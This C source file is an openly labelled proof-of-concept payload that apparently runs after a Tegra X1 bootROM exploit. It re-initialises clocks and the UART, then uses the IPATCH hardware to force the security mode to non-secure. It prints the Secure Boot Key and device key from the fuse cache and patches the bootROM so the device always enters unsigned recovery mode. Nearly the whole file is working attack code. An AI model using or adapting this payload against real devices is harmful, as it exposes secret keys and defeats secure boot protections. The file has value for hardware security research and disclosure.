/**
 * Proof of Concept Payload
 * prints out SBK and then enables non-secure RCM 
 *
 * (some code based on coreboot)
 * ~ktemkin
 */

#include <stdint.h>
#include "registers.h"
#include "t210.h"


#define HEX_CHAR(x) ((((x) + '0') > '9') ? ((x) + '7') : ((x) + '0'))

// Address of the bootrom immediately after it applies ipatches to itself.
#define BOOTROM_START_POST_IPATCH 0x101010

// Set this to 3 to disable _all_ security.
// Set this to 5 if you want to use the SBK only.
// (This is useful if you want to use the standard downstream stack,
//  which will itself read the SBK from fuses to ensure everything's kosher.)
#define DESIRED_SECURITY_MODE 3

// General next-stage image entry point type.
typedef void (*entry_point)(void);

/**
 * We yank execution from the bootROM in the middle of some initialization, leaving it in
 * a state that may not be entireliy defined. (This payload's used for multiple exploits.)
 *
 * We'll provide some functionality to get it into a stable state
 * so we can execute things.
 */

/**
 * Set up the Tegra CLK_M, allowing us to use peripherals from
 * mid-bootrom configuration.
 */
static void set_clk_m(void)
{
    uint32_t spare;

    /* set clk_m frequency to 19.2MHz: set divisor to 2. */
    spare = reg_read(CAR_BASE, 0x55c);
    spare &= ~CLK_M_DIVISOR_MASK;
    spare |= CLK_M_DIVISOR_BY_2;
    reg_write(CAR_BASE, 0x55c, spare);

    /*
     * Restore TIMERUS config for 19.2MHz. (19.2 = 96/5 = 0x60/5)
     * USEC_DIVIDEND(15:8) = 5-1; USEC_DIVISOR(7:0) = 0x60-1
     */
    reg_write(TIMER_BASE, 0x14, 0x045f);
}

/**
 * Delays for the specified number of microseconds
 *
 * @parma usecs The microseconds to delay.
 */
static void udelay(unsigned usecs)
{
    uint32_t start = reg_read(TIMER_BASE, 0x10);
    while (reg_read(TIMER_BASE, 0x10) - start < usecs) ;
}


/**
 * Configures the Tegra MSELECT to resume from the bootrom.
 */
static void config_mselect(void)
{
    /* Set MSELECT clock source to PLL_P with 1:4 divider */
    reg_write(CAR_BASE, 0x3b4, (CLK_SRC_PLLP_OUT0 | MSELECT_CLK_DIVISOR_4));
    /* Enable clock to MSELECT */
    reg_write(CAR_BASE, 0x440, CLK_ENB_MSELECT);
    /* Bring MSELECT out of reset, after 2 microsecond wait */
    udelay(2);
    reg_write(CAR_BASE, 0x434, MSELECT_RST);
}


/**
 * Set up the main system oscillator, again, just in case.
 */
static void config_oscillator(void)
{
    /*
     * Read oscillator drive strength from OSC_EDPD_OVER.XOFS and copy
     * to OSC_CTRL.XOFS and set XOE.
     */
    uint32_t xofs = (reg_read(PMC_BASE, 0x1a4) &
            PMC_XOFS_MASK) >> PMC_XOFS_SHIFT;

    uint32_t osc_ctrl = reg_read(CAR_BASE, 0x50);
    osc_ctrl &= ~OSC_XOFS_MASK;
    osc_ctrl |= (xofs << OSC_XOFS_SHIFT);
    osc_ctrl |= OSC_XOE;
    reg_write(CAR_BASE, 0x50, osc_ctrl);
}



/**
 * Enable getting debug output on UART-A, e.g. via the Suzy-Qu debug adapter.
 */
static void enable_uart(void)
{
  /* set pinmux for UARTA */
  reg_write(PINMUX_BASE, 0xe4, 0b0001000);

  /* ensure the UART's not in deep power down */
  reg_clear(PMC_BASE, 0x1b8, (1 << 14));

  /* Enable UART clock */
  reg_set(CAR_BASE, 0x10, UARTA_CAR_MASK);

  /* Reset and unreset UART */
  reg_set(  CAR_BASE, 0x04, UARTA_CAR_MASK);
  reg_clear(CAR_BASE, 0x04, UARTA_CAR_MASK);


  /* Program UART clock source: PLLP (408000000) */
  reg_write(CAR_BASE, 0x178, 0);

  /* Program 115200n8 to the uart port */
  /* baud-rate of 115200 */
  reg_set(  UARTA_BASE, UART_LCR, LCR_DLAB);
  reg_write(UARTA_BASE, UART_THR_DLAB, (UART_RATE_115200 & 0xff));
  reg_write(UARTA_BASE, UART_IER_DLAB, (UART_RATE_115200 >> 8));
  reg_clear(UARTA_BASE, UART_LCR, LCR_DLAB);

  /* 8-bit and no parity */
  reg_write(UARTA_BASE, UART_LCR, LCR_WD_SIZE_8);

  /* ensure the TX and RX fifos are up */
  reg_write(UARTA_BASE, UART_IIR_FCR, 0);


}

/**
 * Returns true iff we can populate a new character into the UART
 * transmit buffer.
 */
int uart_buffer_available()
{
    uint32_t holding_reg = reg_read(UARTA_BASE, UART_LSR);
    return ((holding_reg >> 5) & 0x01);
}


/**
 * Prints a single character (synchronously) via serial.
 *
 * @param c The character to be printed
 */
void putc(char c)
{
    // If we're about to send a newline, prefix it with a carriage return.
    // This makes our putc behave like a normal console putc.
    if(c == '\n')
        putc('\r');

    // Wait for the holding register to become available.
    while(!uart_buffer_available());

    // Stick data in the holding register...
    reg_write(UARTA_BASE, UART_THR_DLAB, c);
}



/** send an 8 bit byte as two hex characters to the console */
static void dump_byte(uint8_t b)
{
  putc(HEX_CHAR((b >> 4) & 0xf));
  putc(HEX_CHAR(b & 0xf));
}

/** prints a word */
static void dump_word(uint32_t w)
{
    dump_byte(w & 0xff);
    dump_byte(w >> 8);
}

/** print a dword */
static void dump_dword(uint32_t d)
{
    dump_word(d & 0xffff);
    dump_word(d >> 16);
}


/**
 * Prints a string (synchronously) via serial.
 *
 * @param s The string to be printed; must be null terminated.
 */
extern int puts(const char * s)
{
    while(*s) {
        putc(*s);
        ++s;
    }

    return 0;
}

/**
 *  Attempts to restore the system to a usable state from an interruption
 *  anywhere in the bootrom.
 */
void set_up_system()
{
  config_oscillator();
  set_clk_m();

  // Program SUPER_CCLK_DIVIDER.
  reg_write(CAR_BASE, 0x36c, SUPER_CDIV_ENB);
  reg_write(CAR_BASE, 0x374, SUPER_CDIV_ENB);

  config_mselect();
  enable_uart();
}


/**
 * Patches over a given address in the IROM using the IPATCH hardware.
 */
void ipatch_word(uint8_t slot, uint32_t addr, uint16_t new_value)
{
  uint32_t slot_value;
  uint32_t offset;

  // Mark the relevant ipatch slot as not-in-use.
  reg_clear(IPATCH_BASE, IPATCH_SELECT, (1 << slot));

  // Compute the new patch value.
  offset = (addr & 0xFFFF) >> 1;
  slot_value = (offset << 16) | new_value;

  // Figure out the location of the slot to touch.
  reg_write(IPATCH_BASE, IPATCH_REGS + (slot * 4), slot_value);

  // Apply the new one.
  reg_set(IPATCH_BASE, IPATCH_SELECT, (1 << slot));
}

/**
 * Disables a given ipatch.
 */
void unipatch_word(uint8_t slot)
{
  // Mark the relevant ipatch slot as not-in-use.
  reg_clear(IPATCH_BASE, IPATCH_SELECT, (1 << slot));
}


/**
 * Example exploit payload; printks the SBK and enables unsigned RCM.
 */
void main()
{
  entry_point start;
  set_up_system();

  // Say hello.
  puts("Hello from the early X1 bootROM!\n");
  puts("Attempting to patch over the IROM itself.\n");

  // Patch the getSecurityMode function to always return 3 (production non-secure).
  ipatch_word(10, 0x102050, 0x2000 | DESIRED_SECURITY_MODE);

  // Jump into the recovery mode routine.
  puts("I'm going to go ahead and run RCM for you with security off. Have fun. :)\n");
  puts("For reference, your SBK+DK are: ");
  for(int i = 0; i < 5; ++i) {
    dump_dword(reg_read(FUSE_CACHE_SBK_BASE, i * 4));
  }
  puts("\n");

  // Clear bit0 to indicate that this is a fresh boot, and then set bit2 to trigger RCM.
  reg_write(PMC_BASE, PMC_SCRATCH0, (1 << 2));

  // Patch to skip readBctEtc so we always fall back into RCM. :)
  ipatch_word(11, 0x101E1C, 0x4770);

  // Jump back into the bootloader immediately after ipatches are applied
  // to simualte a normal coldboot as best we can. :)
  start = (entry_point)BOOTROM_START_POST_IPATCH;
  start();
}
